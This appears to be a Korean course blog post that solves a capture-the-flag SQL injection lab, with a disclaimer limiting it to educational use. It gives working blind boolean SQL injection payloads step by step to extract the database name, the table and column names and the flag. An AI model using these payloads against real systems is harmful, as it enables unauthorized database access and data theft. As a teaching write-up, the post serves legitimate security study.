---
layout: single
title:  "8 주차 SQL injection 데이터 추출 문제 풀이(4)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(4)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1  SQLi Point 4 문제 </span>

<br>

<img src="/images/2024-06-09-SQLinjection28/image-20240612231453430.png" alt="image-20240612231453430" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span>

***

<br>



<img src="/images/2024-06-09-SQLinjection28/image-20240612231942789.png" alt="image-20240612231942789" style="zoom:67%;" />

![image-20240612232040980](/images/2024-06-09-SQLinjection28/image-20240612232040980.png)

![image-20240612232100428](/images/2024-06-09-SQLinjection28/image-20240612232100428.png)

![image-20240612232120621](/images/2024-06-09-SQLinjection28/image-20240612232120621.png)

![image-20240612232441799](/images/2024-06-09-SQLinjection28/image-20240612232441799.png)

![image-20240612232515765](/images/2024-06-09-SQLinjection28/image-20240612232515765.png)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span>

***

<br>

<img src="/images/2024-06-09-SQLinjection28/image-20240612232820682.png" alt="image-20240612232820682" style="zoom:67%;" />



![image-20240612232803575](/images/2024-06-09-SQLinjection28/image-20240612232803575.png)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span>

***

<br>

1234' and (select 1 union select 2 where (ascii(substr((select ~~),1,1))>0)) and '1'='1

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span>

***

<br>

select database() limit 0,1

1234' and (select 1 union select 2 where (ascii(substr((select database() limit 0,1),1,1))>0)) and '1'='1

![image-20240612233212197](/images/2024-06-09-SQLinjection28/image-20240612233212197.png)

sqli_9

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span>

***

<br>

select table_name from information_schema.tables where table_schema='sqli_9' limit 0,1

1234' and (select 1 union select 2 where (ascii(substr((select table_name from information_schema.tables where table_schema='sqli_9' limit 0,1),1,1))>0)) and '1'='1

![image-20240612233431791](/images/2024-06-09-SQLinjection28/image-20240612233431791.png)

flagHere

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span>

***

<br>

select column_name from information_schema.columns where table_name='flagHere' limit 0,1

1234' and (select 1 union select 2 where (ascii(substr((select column_name from information_schema.columns where table_name='flagHere' limit 0,1),1,1))>0)) and '1'='1

![image-20240612233608694](/images/2024-06-09-SQLinjection28/image-20240612233608694.png)

flag

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span>

***

<br>

select flag from flagHere limit 0,1 

1234' and (select 1 union select 2 where (ascii(substr((select flag from flagHere limit 0,1),1,1))>0)) and '1'='1

![image-20240612233800643](/images/2024-06-09-SQLinjection28/image-20240612233800643.png)

segfault{~~}